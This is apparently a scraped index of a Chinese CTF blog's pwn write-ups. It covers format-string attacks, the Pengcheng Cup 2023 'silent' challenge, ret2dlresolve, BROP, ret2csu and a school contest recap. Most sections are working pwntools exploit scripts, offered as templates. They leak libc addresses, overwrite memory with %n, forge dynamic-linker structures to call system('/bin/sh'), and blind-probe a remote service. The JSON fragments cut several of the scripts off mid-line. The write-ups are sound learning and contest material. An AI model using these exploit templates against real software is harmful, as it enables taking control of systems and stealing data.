Notice\rprintf的第一个参数永远是fmt字符串，其他和正常函数一致。\r","date":"2023-11-09","objectID":"/articles/2023/11/fmt_str/:0:0","tags":["CTF","Pwn"],"title":"格式化字符串漏洞总结","uri":"/articles/2023/11/fmt_str/"},{"categories":["Pwn"],"content":"泄露栈内存 按照上述内容，当fmt字符串可控，我们可以顺序输入栈上的数据。 如果需要通过gdb定位栈位置，一定要在printf处下断点 可以利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。 利用 %s 来获取变量所对应地址的内容，只不过有零截断。如果该变量所对应的并不是合法的地址，程序崩溃 利用%n$p获取栈指定位置的内容，使用%n$s获取栈指定位置内容所对应地址的内容。 ","date":"2023-11-09","objectID":"/articles/2023/11/fmt_str/:1:0","tags":["CTF","Pwn"],"title":"格式化字符串漏洞总结","uri":"/articles/2023/11/fmt_str/"},{"categories":["Pwn"],"content":"泄露任意地址内存 在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。 fmt字符串会按照栈单位大小将其\"分解\"后放在栈上。如果我们在格式化字符串中放上某一个内存地址，那么我们就相当于在栈上写入了需要泄露的内存地址。此时定位其位置，使用%n$s就可以泄露该内存地址的内容。注意：地址一定要充满栈单位，比如64位程序的栈单位是8字节，那么如果地址不满8字节需要填充至8字节。例如： 那么如何确定我们写入地址的位置？这里我们使用如下程序为例： #include \u003cstdio.h\u003e int main() { char s[100]; int a = 1, b = 0x22222222, c = -1; scanf(\"%s\", s); printf(\"%08x.%08x.%08x.%s\\n\", a, b, c, s); printf(s); return 0; } 输入AAAA（因为是32位程序，四字节地址），然后使用gdb进行调试。栈布局如下所示： 栈顶是printf的返回地址，下面则是printf的第一个参数，发现他们都指向0x14的位置，该位置数出来是printf的第5个参数，那么就相对fmt4个长度。因此，我们可以通过%4$s来读取地址为AAAA处的内存地址。 除了使用gdb，我们可以直接输入多个%p来顺序打印栈上的内容，直到我们找到AAAA为止。如下所示： 请保证输入大小够用。 数一下，刚好是第四个%p，那么相对位置就是第四个。 现在，我们尝试输出scanf的地址：（32位libc中，scanf的名称为：__isoc99_scanf） from pwn import * context(arch='i386',os='linux') context.log_level='debug' context.terminal=['tmux','splitw','-h'] elf = ELF('./stackleak') libc = elf.libc r = elf.process() scanf_got = elf.got['__isoc99_scanf'] payload = flat([ scanf_got, '%4$s' ]) gdb.attach(r) r.sendline(payload) r.recvuntil(b'%4$s\\n') leak = u32(r.recv(8)[4:8]) info(hex(leak)) r.interactive() 最终确实输出了scanf的实际地址： ","date":"2023-11-09","objectID":"/articles/2023/11/fmt_str/:2:0","tags":["CTF","Pwn"],"title":"格式化字符串漏洞总结","uri":"/articles/2023/11/fmt_str/"},{"categories":["Pwn"],"content":"覆盖栈上内存地址 这里涉及到一个格式化字符：%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 那么参照上面的过程，我们在输入中填充一些字符即可写入对应个数的字符。 [addr][padding]%x$n 现有如下程序： /* example/overflow/overflow.c */ #include \u003cstdio.h\u003e int a = 123, b = 456; int main() { int c = 789; char s[100]; printf(\"%p\\n\", \u0026c); scanf(\"%s\", s); printf(s); if (c == 16) { puts(\"modified c.\"); } else if (a == 2) { puts(\"modified a for a small number.\"); } else if (b == 0x12345678) { puts(\"modified b for a big number!\"); } return 0; } 我们来修改栈上变量c的值。首先使用之前的手段判断偏移： 发现是第六个参数。由于程序本身给出了c变量的地址，那么我们直接将地址写入第六个位置即可。 from pwn import * context(arch='i386',os='linux') context.log_level='debug' context.terminal=['tmux','splitw','-h'] elf = ELF('./overwrite') libc = elf.libc r = elf.process() leak = int(r.recv(10),16) payload = flat([ leak, '%012d' '%6$n' ]) r.sendline(payload) r.interactive() 成功修改。 ","date":"2023-11-09","objectID":"/articles/2023/11/fmt_str/:3:0","tags":["CTF","Pwn"],"title":"格式化字符串漏洞总结","uri":"/articles/2023/11/fmt_str/"},{"categories":["Pwn"],"content":"覆盖任意地址内存为小数字 对于32位程序来说，地址肯定是4字节的。如果将地址放在开头，那么至少会写成4。为了写更小的数字，可以将地址放在后面。 由于此时地址是按4字节分割的，我们不用重新定位位置。按照上次定位的位置推即可。 AA$8$nxx[addr] 因为要将a改写为2，$8$n前面只能有2个字符。然后为了凑整，后面再次填写两个字符。最后再加上地址即可。此时的参数位置： 因此写入第八位即可改写addr处的地址位2。 from pwn import * context(arch='i386',os='linux') context.log_level='debug' context.terminal=['tmux','splitw','-h'] elf = ELF('./overwrite') libc = elf.libc r = elf.process() leak = 0x804C024 payload = flat([ 'AA', '%8$nxx', leak ]) r.sendline(payload) r.interactive() ","date":"2023-11-09","objectID":"/articles/2023/11/fmt_str/:4:0","tags":["CTF","Pwn"],"title":"格式化字符串漏洞总结","uri":"/articles/2023/11/fmt_str/"},{"categories":["Pwn"],"content":"覆盖任意地址内存为大地址 上面介绍了覆盖小数字，这里我们介绍如何覆盖大数字。上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？自然是有了。 不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \\ x78\\x56\\x34\\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志： hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。 h 对于整数类型，printf期待一个从short提升的int尺寸的整型参数。 所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。 首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804c024。 即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。 0x0804c024 \\x78 0x0804c025 \\x56 0x0804c026 \\x34 0x0804c027 \\x12 首先，由于我们的字符串的偏移为 6，所以我们可以确定我们的 payload 基本是这个样子的： p32(0x0804c024)+p32(0x0804c025)+p32(0x0804c026)+p32(0x0804c027)+pad1+'%6$n'+pad2+'%7$n'+pad3+'%8$n'+pad4+'%9$n' 接下来，我们需要将已经写入的字符个数和需要修改的内容做差，即可求出padding的具体大小。这里为了方便，可以使用pwntools自带的fmtstr_payload函数构造payload： fmtstr_payload(6,{0x0804c024:0x12345678}) from pwn import * context(arch='i386',os='linux') context.log_level='debug' context.terminal=['tmux','splitw','-h'] elf = ELF('./overwrite') libc = elf.libc r = elf.process() leak = 0x804C028 payload = fmtstr_payload(6,{leak:0x12345678}) r.sendline(payload) r.interactive() 结果如下： 以上是格式化字符串使用的基本思路。平常的使用经常会和劫持GOT表或者返回地址结合来达到getshell的效果。 ","date":"2023-11-09","objectID":"/articles/2023/11/fmt_str/:5:0","tags":["CTF","Pwn"],"title":"格式化字符串漏洞总结","uri":"/articles/2023/11/fmt_str/"},{"categories":["Pwn"],"content":"补充 由于64位地址正常不会满8字节，因此请将地址放在fmt后面，这样可以防止地址高位补0而导致的零截断。 %6$sxxxx\\xc0\\x40\\x40\\x00\\x00\\x00\\x00\\x00 # fault: \\xc0\\x40\\x40\\x00\\x00\\x00\\x00\\x00%6$sxxxx ","date":"2023-11-09","objectID":"/articles/2023/11/fmt_str/:6:0","tags":["CTF","Pwn"],"title":"格式化字符串漏洞总结","uri":"/articles/2023/11/fmt_str/"},{"categories":["Pwn"],"content":"这个鹏城杯才是我真正意义上的第一场CTF。虽然之前有过校赛，但是校赛上简单题非常多，还是可以混混分的。这场应该算是像样的CTF（甚至还有点恶心），直接给我虐昏了。只能赛后补补题了。 而且比赛当天感冒了，当然这不是关键问题。我学的内容还是比较少的，先把能补的补了，持续更新。 ","date":"2023-11-06","objectID":"/articles/2023/11/pcb2023/:0:0","tags":["CTF","Pwn","WriteUp"],"title":"鹏城杯2023WriteUp-Pwn","uri":"/articles/2023/11/pcb2023/"},{"categories":["Pwn"],"content":"silent 唯一有希望做出来的题，看完题解后发现是唯一没希望做出来的题。 首先谈谈思路：由于开启了seccomp禁掉了execve，所以one_gadget直接被毙掉。反编译发现程序只有输入（read函数），没有输出，system更是无从谈起。但是输出是必须的。没有输出就没有地址，没有地址就拿不到libc，没有libc什么函数都用不了（这题显然应该是orw拿flag）。于是这里我们要谈一个叫magic gadget的东西。 我们可以在程序中发现一个叫stdout的东西，具体来说叫：stdout@@GLIBC_2_2_5。实际上它存在于libc中，是libc中的一个symbol。我们知道在进程中libc函数的相对位置是固定的，那么我们就可以通过相对的偏移将stdout所在的位置的地址改为其他libc函数，再call stdout的地址即可执行想要的函数。 magic gadget就是通过寄存器做到任意修改内存地址的gadgets，它在ida中是找不到的，因为是通过错位的字节码来获得的。使用ROPgadget工具可以找到它的地址： ROPgadget --binary silent | grep ret | grep '\\[rbp' # 0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret 即：add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret这三条指令。我们仅需关注第一条指令：它会将rbp - 0x3d所代表的内存处的数值增加ebx。rbp和ebx是很容易控制的，因此可以实现任意内存地址的读写。 根据大佬们的博客，掌握了上面的内容，下面的内容基本属于固定套路。为了泄露libc基地址，我们需要输出已知函数（read）的实际地址（GOT地址）。我们只需要将stdout偏移至syscall，然后控制rax为1，即可完成write的功能。 如何控制rax为1？我们知道，当执行成功的时候，write和read的返回值分别是成功输出和读入的字节数，而返回值就存放在rax寄存器中。于是我们只需要read1个字节的数据到任意的地点即可完成对rax寄存器的控制。 总结下，如果遇到可用函数很少的情况： 找到存在于libc中的一个函数（通常是stdout），使用magic gadget偏移到syscall上。 使用read函数控制rax为1，然后执行syscall泄露libc地址。 那么再讨论实现的细节。由于溢出空间比较小（实际上是ret2csu所需要空间比较大），首先要做的是将之后的payload读取到bss区然后将栈迁移过去。这个非常简单，具体实现如下所示： payload1 = flat([ b'a' * 0x48, # 填充至retn address csu1, 0, 1, read_got, 0, base_stage, 0x200, # 将payload读取到base_stage,地址可以任意选择 csu2, 0, 0, base_stage - 0x8, 0, 0, 0, 0, leave_ret # 栈迁移到base_stage，这里减一个0x8是为了让rsp在leave后刚好在base_stage ]) r.send(payload1) csu的两段代码如下，可以在IDA中轻松的找到： csu1 = 0x40095A ''' pop rbx pop rbp pop r12 pop r13 pop r14 pop r15 retn ''' csu2 = 0x400940 ''' mov rdx, r15 mov rsi, r14 mov edi, r13d call ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8] add rbx, 1 cmp rbp, rbx jnz short loc_400940 ''' 接下来我们就使用magic gadget将stdout偏移为syscall。这里有个细节，为了加上一个负数，这里需要将负数写成补码，方法如下： offset = (libc.sym['syscall'] + 27 - libc.sym['_IO_2_1_stdout_']) \u0026 0xffffffffffffffff 为什么要加27呢？因为这个syscall执行前会有很多额外操作，实测会影响下面进程，于是这里直接偏移到call syscall这一条指令上来最为方便。另外，stdout在libc中的名称是_IO_2_1_stdout_!!!而且也有名叫stdout的symbol，千万不要弄混。这两者的区别尚不明确。 接下来，我们使用read读取一个字节来控制rax，结束后将下一段payload读取到另外一个位置，再次栈迁移。这是因为我们要在当前的payload末尾放入一个/flag字符串为接下来orw做准备。如果接着这个栈的位置使用会有连续性上的问题。这里我比较懒，直接再开一个空间放下一个栈好了。 payload2 = flat([ csu1, offset, stdout + 0x3d, 0, 0, 0, 0, # stdout移动offset magic, csu1, 0, 1, read_got, 0, elf.bss(0x800), 0x1, # 修改rax csu2, 0, 0, 1, stdout, 0x1, read_got, 0x8, # 执行syscall -\u003e write csu2, 0, 0, 1, read_got, 0, base_stage + 0x400, 0x200, # 将下一个payload读到base_stage + 0x400 csu2, 0, 0, base_stage + 0x400 - 0x8, 0, 0, 0, 0, leave_ret, # 迁移 b'/flag\\x00\\x00\\x00' # 字符串的位置在base_stage + 40 * 8 ]) r.send(payload2) r.send(b'\\x00') # 别忘了随便发 然后就是泄露地址，然后计算orw三个函数的真实地址： libc_base = u64(r.recvuntil(b'\\x7f').ljust(8,b'\\x00')) - libc.sym['read'] # info(hex(libc_base)) open_addr = libc.sym['open'] + libc_base write_addr = libc.sym['write'] + libc_base read_addr = libc.sym['read'] + libc_base 最后就是orw的基本过程，这里pop rsi和pop rdx的gadgets在程序中找不到，只能去libc中找了。这里为什么不用ret2csu呢？因为用ret2csu中的call执行open函数会直接死掉，这里原因尚不明确，等知道了再来补。 rdi = 0x400963 rsi = libc_base + 0x2601f rdx = libc_base + 0x142c92 payload3 = flat([ rdi, base_stage + 40 * 8, rsi, 0, open_addr, rdi, 3, rsi, elf.bss(), # 地址随便填 rdx, 0x40, read_addr, rdi, 1, write_addr, 0 ]) r.send(payload3) r.interactive() 因为是复盘所以这里没有用题目给的libc，也不想再patch了。但是和实际情况基本没差，只要将exp中的libc加载成题目给的即可。 实际运行结果： flag文件是自己创建在根目录下的。下面给出完整的exp： from pwn import* context(arch='amd64',os='linux',log_level='info') context.terminal = ['tmux','splitw','-h'] elf = ELF('./silent') libc = elf.libc r = elf.process() offset = (libc.sym['syscall'] + 27 - libc.sym['_IO_2_1_stdout_']) \u0026 0xffffffffffffffff info(hex(offset)) stdout = 0x601020 read_got = elf.got['read'] base_stage = elf.bss(0x80) leave_ret = 0x400876 csu1 = 0x40095A ''' pop rbx pop rbp pop r12 pop r13 pop r14 pop r15 retn ''' csu2 = 0x400940 ''' mov rdx, r15 mov rsi, r14 mov edi, r13d call ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8] add rbx, 1 cmp rbp, rbx jnz short loc_400940 ''' payload1 = flat([ b'a' * 0x48, csu1, 0, 1,","date":"2023-11-06","objectID":"/articles/2023/11/pcb2023/:1:0","tags":["CTF","Pwn","WriteUp"],"title":"鹏城杯2023WriteUp-Pwn","uri":"/articles/2023/11/pcb2023/"},{"categories":["Pwn"],"content":"首先要对延迟绑定机制做一个补充，即在延迟绑定中使用的表的名称和功能。 ELF JMPREL Relocation Table elf-rel函数重定位表，即ELF程序的.rel.plt段。该段结构的定义如下： Elf32_Rel struc ; (sizeof=0x8, align=0x4, copyof_2) 00000000 r_offset dd ? 00000004 r_info dd ? 00000008 Elf32_Rel ends 其中，r_offset是该函数的GOT表的虚拟地址，r_info是该函数在dynsym表中的下标。 那么如何通过dl_runtime_resolve获得该函数的Rel地址？dl_runtime_resolve的第一个参数为reloc_arg，而rel_plt_addr + reloc_arg的地址即为该函数的rel表地址。 ELF Symbol Table 此表即dynsym表。存放着动态链接函数更多的信息，定义如下： Elf32_Sym struc ; (sizeof=0x10, align=0x4, mappedto_1) 00000000 st_name dd ? 00000004 st_value dd ? 00000008 st_size dd ? 0000000C st_info db ? 0000000D st_other db ? 0000000E st_shndx dw ? 00000010 Elf32_Sym ends 这里我们关心几点：1、一个ELF32_Sym结构的大小是16，这个将方便我们之后的伪造。2、st_name为该函数名字符串在dynstr表中的偏移。3、st_value应该是该函数相对于libc的偏移地址。（不确定，也不需要用） 这里我们只需要知道GOT表的重写过程是根据st_name来进行的，我们之后仅需要伪造st_name即可。 ELF String Table 此表仅存放函数名（字符串），偏移是dynsym表中的st_name。无结构，大致内容如下： 以上的三个表均存放在link_map中，而link_map存放在got+4的位置。dl_runtime_resolve的位置在got+8。link_map会在plt[0]中被压入栈中，然后跳转至dl_runtime_resolve函数的位置执行。 伪造思路 由于GOT表重写过程对函数的定位均是通过偏移进行的。这里我们不妨让这个偏移更大一点，大到最后的计算出的实际地址是我们可以控制的地址。然后我们在这个地址上分别写入该函数的.rel.plt表、.dynsym表和.dynstr表为我们想要的函数，那么就可以在plt[0]（也就是延迟绑定的过程中）执行任意函数。 由于构造所需的空间较大，这里我们的思路如下： 首先将payload读入伪造栈的位置（一般是bss段的位置） 然后将栈迁移至伪造栈的位置执行即可。 迁移栈很简单，我们现在需要知道栈该如何构造才行。这里为了执行system函数，构造栈如下： 然后，我们使用read函数，将上面构造的栈写入bss位置，并进行栈迁移即可。 模板 详细解释看注释 from pwn import * context(arch='i386',os='linux') context.terminal = ['tmux','splitw','-h'] elf = ELF('./rof') libc = ELF('/lib/i386-linux-gnu/libc.so.6') r = elf.process() read_plt = elf.sym['read'] write_plt = elf.sym['write'] ppp_ret = 0x08049351 # pop esi ; pop edi ; pop ebp ; ret pop_ebp_ret = 0x08049353 leave_ret = 0x08049165 stack_size = 0x800 bss_addr = 0x804c028 # readelf -S rof | grep .bss base_stage = bss_addr + stack_size r.recvuntil(b'Welcome to XDCTF2015~!\\n') payload = b'a' * 112 payload += p32(read_plt) payload += p32(ppp_ret) # 弹出下面3个栈单位 payload += p32(0) payload += p32(base_stage) # 栈迁移的位置 payload += p32(100) #总共100个字节，下面也得填充到100个字节 payload += p32(pop_ebp_ret) # 移动ebp至base_stage payload += p32(base_stage) payload += p32(leave_ret) #迁移栈顶，开始执行base+stage + 4位置的代码 r.send(payload) # fake dynsym （base_stage + 36） dynsym = 0x8048248 dynstr = 0x80482e8 fake_dynsym = base_stage + 36 # 36 = 4 * 9 alg = 0x10 - ((fake_dynsym - dynsym) \u0026 0xf) # 两者的差可以被0x10整除，因为一个ELF32Sym的大小为固定的0x10，而且需要使用下标定位每个函数的sym fake_dynsym = fake_dynsym + alg # 0x10对齐 sym_index = (fake_dynsym - dynsym) // 0x10 # 计算dynsym[sym_index] r_info = (sym_index \u003c\u003c 8) | 0x7 # 根据ELF32_R_SYM(info) ((info)\u003e\u003e8) 反推出.rel.plt中的r_info，其中最低为必须为7 st_name = (fake_dynsym + 0x10) - dynstr # func_name = *(dynstr + st_name) 伪造的st_name就放在fake_sym的后面，而fake_sym的大小是4 * 4 = 16, 所以st_name = （fake_dynsym + 0x10） - dynstr fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12) # 伪造write函数的符号表，按照结构体的规定，该内容将被填入base_stage+36的部位 # fake .rel.plt （base_stage + 28） plt_0 = 0x8049030 # push link_map;jmp dl_runtime_resolve rel_plt = 0x80483a0 fake_rel_plt = base_stage + 28 # 28 = 4 * 7 fake_reloc = fake_rel_plt - rel_plt # rel_plt + fake_reloc -\u003e base_stage + 28 -\u003e fake_rel_plt r_offset = elf.got['write'] # r_info 已经计算完毕 fake_rel = p32(r_offset) + p32(r_info) # 伪造write函数.rel.plt内容 # 调用过程： # .rel.plt + reloc_arg -\u003e write_rel_plt (r_offset r_info) # dynsym[(r_info) \u003e\u003e 8] -\u003e write_sym (st_name st_value) # dynstr[st_name] = 'write' bin_sh = b'/bin/sh\\x00' payload = b'AAAA' payload += p32(plt_0) # push link_map;jmp dl_runtime_resolve payload += p32(fake_reloc) # reloc_arg payload += p32(0xdead) # retn addr payload += p32(base_stage + 80) # system arg payload += b'AAAA' # base_stage + 20 payload += b'AAAA' # base_stage + 24 payload += fake_rel # fake .rel.plt base_stage + 28 (8 bytes) payload += alg * b'A' # base_stage + 36 payload += fake_sym # fake .dynsym base_stage + 36 + algin (16 bytes) payload += b'system\\x00' # fake st_name base_stage + 36 + algin + 0x10 (6 bytes) payload += b'A' * (80 - len(payload)) payload += bin_sh # base_stage + 80 payload += b'A' * (100 - len(payload)) # read(0,","date":"2023-11-03","objectID":"/articles/2023/11/advancerop-ret2dlresolve/:0:0","tags":["CTF","Pwn","二进制"],"title":"AdvanceROP-ret2dlresolve","uri":"/articles/2023/11/advancerop-ret2dlresolve/"},{"categories":["Pwn"],"content":"BROP即Blind ROP。如果当题目没有给出二进制文件的时候，就得通过BROP的方式盲打。大概的思路如下： （确定有栈溢出的存在）通过依次增加输入数量，确定何时可以覆盖返回地址 确定溢出长度（padding） 脚本如下： from pwn import* def getsize(): i = 1 while 1: try: p = remote('127.0.0.1',9999) p.recvuntil(\"WelCome my friend,Do you know password?\\n\") p.send(i * b'a') data = p.recv() p.close() if not data.startswith(b'No password'): return i-1 else: i+=1 except EOFError: p.close() return i-1 size = getsize() print(\"size is [{}]\".format(size)) 这里减一是因为程序出错的时候以及覆盖了retn地址，但是我们只希望padding填充满rbp的位置即可。 结果如上，说明需要填充72个字符。 寻找stop_gadgets stop_gadgets可以理解为main的地址或者__libc_start_main的地址。我们不能让payload执行完直接退出，为了多次执行，必须找到一个可以返回的地址。 from pwn import * length = 72 def getStopGadgets(length): addr = 0x4005b0 while 1: try: sh = remote('127.0.0.1',9999) payload = 'a'*length +p64(addr) sh.recvuntil(\"know password?\\n\") sh.sendline(payload) output = sh.recvuntil(\"password?\\n\") sh.close() print(\"one success addr 0x%x:\" % (addr)) if not output.startswith('WelCome'): sh.close() addr+=1 else: return addr except Exception: addr+=1 sh.close() stop_gadgets = getStopGadgets(length) PS：64位程序的加载地址从0x400000开始 这里得到的地址就是start（本地未跑成功，原因未知） 寻找brop_gadgets from pwn import * def get_brop_gadget(length, stop_gadget, addr): try: sh = remote('127.0.0.1', 9999) sh.recvuntil('password?\\n') payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10 sh.sendline(payload) content = sh.recv() sh.close() print(content) # stop gadget returns memory #if not content.startswith('WelCome'): # return False return True except Exception: sh.close() return False def check_brop_gadget(length, addr): try: sh = remote('127.0.0.1', 9999) sh.recvuntil('password?\\n') payload = 'a' * length + p64(addr) + 'a' * 8 * 10 sh.sendline(payload) content = sh.recv() sh.close() return False except Exception: sh.close() return True ##length = getbufferflow_length() length = 72 ##get_stop_addr(length) stop_gadget = 0x4005c0 addr = 0x400740 #######get_brop_gadgets_addr####### while 1: print(hex(addr)) if get_brop_gadget(length, stop_gadget, addr): print('possible brop gadget: 0x%x' % addr) if check_brop_gadget(length, addr): print('success brop gadget: 0x%x' % addr) break addr += 1 找到了可用的gadgets 寻找put地址 原理是打印出ELF头的几个字节，如果可以，就是了 from pwn import * ##length = getbufferflow_length() length = 72 ##get_stop_addr(length) stop_gadget = 0x4005c0 addr = 0x400740 def get_puts_addr(length, rdi_ret, stop_gadget): addr = 0x400000 while 1: print hex(addr) sh = remote('127.0.0.1', 9999) sh.recvuntil('password?\\n') payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget) sh.sendline(payload) try: content = sh.recv() if content.startswith('\\x7fELF'): print 'find puts@plt addr: 0x%x' % addr return addr sh.close() addr += 1 except Exception: sh.close() addr += 1 brop_gadget=0x4007ba rdi_ret=brop_gadget+9 get_puts_addr(72,rdi_ret,stop_gadget) dump源程序 使用发现的puts地址将程序dump下来 from pwn import * def dump(length, rdi_ret, puts_plt, leak_addr, stop_gadget): sh = remote('127.0.0.1', 9999) payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget) sh.recvuntil('password?\\n') sh.sendline(payload) try: data = sh.recv() sh.close() try: data = data[:data.index(\"\\nWelCome\")] except Exception: data = data if data == \"\": data = '\\x00' return data except Exception: sh.close() return None ##length = getbufferflow_length() length = 72 ##stop_gadget = get_stop_addr(length) stop_gadget = 0x4005c0 ##brop_gadget = find_brop_gadget(length,stop_gadget) brop_gadget = 0x4007ba rdi_ret = brop_gadget + 9 ##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget) puts_plt = 0x400555 addr = 0x400000 result = \"\" while addr \u003c 0x401000: print hex(addr) data = dump(length, rdi_ret, puts_plt, addr, stop_gadget) if data is None: continue else: result += data addr += len(data) with open('code', 'wb') as f: f.write(result) 寻找puts的GOT地址 按照之前找到的puts地址，即可找到GOT表中puts的地址 ret2libc 接下来就是ret2libc的过程 ##length = getbufferflow_length() length = 72 ##stop_gadget = get_stop_addr(length) stop_gadget = 0x4006","date":"2023-11-02","objectID":"/articles/2023/11/rop-brop/:0:0","tags":["Pwn","CTF","二进制"],"title":"ROP-BROP","uri":"/articles/2023/11/rop-brop/"},{"categories":["Pwn"],"content":"_libc_csu_init是64位程序几乎必有的一个函数，用来对libc.so进行初始化。该函数会对一些常用的寄存器进行初始化。如下所示： 我们就可以通过栈溢出转到这两个gadgets处进行执行，从而利用栈上的数据为寄存器赋值，然后执行目标函数。 这里分析下两个gadgets的流程（按照顺序）： 将rsp+8的内容赋值给rbx，这里必须是0，原因在下面 将rsp+16的内容赋值给rbp，这里选择1，原因稍后 rsp+24 -\u003e r12， rsp+32 -\u003e r13 rsp+40 -\u003e r14 rsp+48 -\u003e r15 栈顶下移0x38 r15 -\u003e rdx r14 -\u003e rsi r13d -\u003e edi （就是rdi的低位） 执行 r12 + rbx*8 位置的指令，因为rbx为0，这里就等于r12指向的地址 rbx += 1，此时rbx=1 为了不进行跳转，这里必须使得rbx==rbp，由于rbx==1，rbp==1，因此两者相等 64位函数调用的参数顺序依次为：rdi,rsi,rdx,rcx,r8,r9,栈，如果要利用csu进行函数调用，栈的布局应该如下所示： 对于ret2csu的payload均按此构造即可。 给出payload模板： payload1 = b\"\\x00\"*136 payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) payload1 += p64(0x4005F0) payload1 += b\"\\x00\"*56 payload1 += p64(main) 实际上需要更改的只有这个部分： PS： padding最好使用\\x00，不然会有莫名其妙的问题 关闭地址随机化 使用system需要将地址写入bss段再进行调用 模板：（第一次payload泄露write地址，从而获得libc偏移；第二次payload向bss写入system addr，第三次payload执行system指令） from pwn import * context(arch='amd64',os='linux') elf = ELF('./level5') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') r = elf.process() main = 0x400564 got_write = elf.got['write'] gadgets1 = 0x400606 gadgets2 = 0x4005f0 payload1 = b\"a\"*136 payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) payload1 += p64(0x4005F0) payload1 += b\"a\"*56 payload1 += p64(main) r.recvuntil(b'Hello, World\\n') r.send(payload1) write_addr = u64(r.recvuntil(b'\\x7f').ljust(8,b'\\x00')) libc_addr = write_addr - libc.sym['write'] system_addr = libc_addr + libc.sym['system'] got_read = elf.got['read'] bss_addr = 0x601028 payload2 = b\"\\x00\"*136 payload2 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) payload2 += p64(0x4005F0) payload2 += b\"\\x00\"*56 payload2 += p64(main) r.recvuntil(b'Hello, World\\n') r.send(payload2) r.send(p64(system_addr) + b'/bin/sh\\0') payload3 = b\"\\x00\"*136 payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8] payload3 += b\"\\x00\"*56 payload3 += p64(main) gdb.attach(r) r.recvuntil(b'Hello, World\\n') sleep(1) r.send(payload3) r.interactive() ","date":"2023-11-02","objectID":"/articles/2023/11/rop-ret2csu/:0:0","tags":["Pwn","CTF","二进制"],"title":"ROP-ret2csu","uri":"/articles/2023/11/rop-ret2csu/"},{"categories":["Pwn"],"content":"random 伪随机数，这个没用种子的话输出是一样的 orw 本质是读取一段shellcode后直接执行，问题在于有沙箱机制（看题解知道是seccomp机制） 这里要知道的是orw的固定shellcode shellcode=asm(shellcraft.amd64.open('/flag'))# 打开一个名为'/flag'的文件 shellcode+=asm(shellcraft.amd64.read('rax'，'rsp'，0x40))# 读取该文件的内容 shellcode+=asm(shellcraft.amd64.write(1，'rsp'，0x40))# 将内容写入到标准输出（即屏幕） 这里实际上是将flag的内容直接读入栈顶，挺好理解的，这种写法的话可以不用记shellcode bof 关于栈对齐的问题：可以直接加ret或者返回到call _system，都可以保持栈平衡 待续 ","date":"2023-10-31","objectID":"/articles/2023/10/%E6%A0%A1%E8%B5%9Bpwn%E5%A4%8D%E7%9B%98/:0:0","tags":["CTF","Pwn","二进制"],"title":"校赛Pwn复盘","uri":"/articles/2023/10/%E6%A0%A1%E8%B5%9Bpwn%E5%A4%8D%E7%9B%98/"},{"categories":["WriteUp"],"content":"Misc ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:0:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x01 旺旺的课程表 首先根据提示《死亡之链》和图片中的时间信息猜测是夏多密码。 根据表中的数字判断总共16个钟表，然后根据每个数字所在的位置的时间画上时针，如下图所示： 按照夏多密码的解密方法旋转和对表，结果是CYBERSECRURITY。 但是直接交上去flag并不对，这时候想到图片隐写。 先用Binwalk跑一遍发现没有结果。（zlib很可能是png自己的数据） 这时想到LSB隐写。于是使用StegSolve打开，左右调节信道，发现二维码： 扫描得到结果是： vigenere:T29tAGSCf2KaZAXeBkylQrsiw3MhR3PocagnRqWrEhX5JYS4PHVlRFGnHb04LFZlPKTlANV3HcSbKHVyEB0uCXpaboShCJTycQEtBETffB4 根据提示，使用维吉尼亚密码解密，密钥就是cybersecurity。 解得：R29vZCBKb2IgISEgZmxhZzogc3VzY3RmezcwZmUxNzE5LWU4ODEtNDMwZi04NDBkLTBhYTE3ZjUzMGRhMX0sIGhhdmUgYSBuaWNlIGRheX4 疑似Base编码，于是用base64解得flag： 